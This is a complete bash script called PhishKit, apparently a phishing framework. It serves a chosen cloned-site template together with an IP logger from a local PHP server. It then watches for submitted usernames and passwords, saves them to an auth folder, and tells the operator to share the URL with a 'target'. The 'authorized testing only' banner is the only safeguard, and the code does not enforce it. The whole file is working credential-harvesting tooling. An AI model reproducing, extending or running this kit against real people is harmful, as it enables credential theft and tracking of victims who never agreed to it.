#!/bin/bash

# PhishKit - Phishing Page Framework for Authorized Penetration Testing
# Usage: sudo bash phishkit.sh

## Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

HOST="127.0.0.1"
PORT="8080"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

## Banner
banner() {
    clear
    echo -e "${RED}"
    echo "  ____  _     _     _    _ _ _   _ "
    echo " |  _ \| |__ (_)___| | _(_) | |_| |"
    echo " | |_) | '_ \| / __| |/ / | | __| |"
    echo " |  __/| | | | \__ \   <| | | |_|_|"
    echo " |_|   |_| |_|_|___/_|\_\_|_|\__(_)"
    echo -e "${NC}"
    echo -e "${CYAN}  Phishing Page Framework v2.0${NC}"
    echo -e "${YELLOW}  For Authorized Security Testing Only${NC}"
    echo ""
}

## List available templates
list_templates() {
    echo -e "${BLUE}[+] Available Templates:${NC}"
    echo ""
    local i=1
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        echo -e "  ${GREEN}$i)${NC} $name"
        i=$((i+1))
    done
    echo ""
}

## Setup and start server
setup_site() {
    local site_name="$1"
    local site_dir="$BASE_DIR/.sites/$site_name"
    local www_dir="$BASE_DIR/.server/www"

    mkdir -p "$www_dir"
    rm -rf "$www_dir"/*

    echo -e "${BLUE}[+] Setting up server for: ${WHITE}$site_name${NC}"

    # Copy template files
    cp -r "$site_dir"/* "$www_dir/"
    # Copy IP logger
    cp "$BASE_DIR/.sites/ip.php" "$www_dir/"

    echo -e "${BLUE}[+] Starting PHP server on ${WHITE}$HOST:$PORT${NC}"
    cd "$www_dir" && php -S "$HOST:$PORT" > /dev/null 2>&1 &
    echo -e "${GREEN}[+] Server running at: http://$HOST:$PORT${NC}"
    echo ""
}

## Monitor for captured credentials
monitor() {
    local www_dir="$BASE_DIR/.server/www"
    local auth_dir="$BASE_DIR/auth"
    mkdir -p "$auth_dir"

    echo -e "${YELLOW}[*] Monitoring for credentials... (Ctrl+C to stop)${NC}"
    echo ""

    while true; do
        if [[ -f "$www_dir/ip.txt" ]]; then
            while IFS= read -r line; do
                if [[ ! -f "$auth_dir/ip_log.txt" ]] || ! grep -qF "$line" "$auth_dir/ip_log.txt" 2>/dev/null; then
                    echo "$line" >> "$auth_dir/ip_log.txt"
                    echo -e "${RED}[!]${NC} ${YELLOW}New visitor logged${NC}"
                    echo "$line"
                fi
            done < "$www_dir/ip.txt"
        fi

        if [[ -f "$www_dir/usernames.txt" ]]; then
            while IFS= read -r line; do
                if [[ ! -f "$auth_dir/credentials.txt" ]] || ! grep -qF "$line" "$auth_dir/credentials.txt" 2>/dev/null; then
                    echo "$line" >> "$auth_dir/credentials.txt"
                    echo -e "${RED}[!]${NC} ${GREEN}Credentials Captured!${NC}"
                    echo -e "${WHITE}$line${NC}"
                    echo ""
                fi
            done < "$www_dir/usernames.txt"
        fi

        sleep 1
    done
}

## Cleanup
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    rm -rf "$BASE_DIR/.server"
    echo -e "${GREEN}[+] Done.${NC}"
    exit 0
}

## Main
main() {
    banner
    list_templates

    echo -ne "${CYAN}[?] Select template number: ${NC}"
    read choice

    local i=1
    local selected=""
    for site in "$BASE_DIR/.sites"/*/; do
        if [[ $i -eq $choice ]]; then
            selected=$(basename "$site")
            break
        fi
        i=$((i+1))
    done

    if [[ -z "$selected" ]]; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi

    trap cleanup EXIT INT TERM

    setup_site "$selected"

    echo -e "${CYAN}[?] Share this URL with your target:${NC}"
    echo -e "${GREEN}  http://$HOST:$PORT${NC}"
    echo ""

    monitor
}

main